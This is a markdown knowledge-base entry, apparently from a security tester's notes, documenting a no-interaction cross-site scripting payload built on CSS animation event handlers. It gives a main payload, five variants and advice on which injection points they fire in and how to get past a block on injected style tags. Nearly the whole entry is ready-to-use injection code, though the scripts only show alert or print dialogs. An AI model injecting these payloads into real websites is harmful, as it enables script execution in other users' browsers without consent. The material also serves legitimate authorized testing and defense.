---
title: CSS Animation Event Handlers (no interaction)
slug: css-animation-event-handlers
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# CSS Animation Event Handlers (no interaction)

## Payload

```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
```

## Variants

```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>
```

## Context

Fires without any user interaction when injected into `innerHTML`/`outerHTML`/`document.write` or reflected directly into HTML. The `<style>` block can reference an existing `@keyframes` name already on the page if injecting `<style>` is blocked — only the element with `animation-name` and the handler is needed in that case. Works in all modern browsers; webkit variants cover older Safari/Chrome. `onanimationcancel` requires `:target` to match the element's `id`, so the URL must include `#x`.

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
